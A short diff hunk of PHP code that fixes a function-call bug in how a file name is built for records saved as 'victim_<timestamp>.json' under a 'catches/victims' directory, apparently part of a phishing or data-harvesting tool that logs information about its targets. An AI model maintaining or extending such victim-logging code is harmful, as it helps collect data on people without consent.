@@ -51,7 +51,7 @@
     "CurrentTime"  => date('Y-m-d H:i:s')
   );
 
-  $fileName = 'victim_' . $time() . '.json';
+  $fileName = 'victim_' . time() . '.json';
   $infosDir = "./catches/victims/infos";
   $filePath  = $infosDir . $fileName;
 
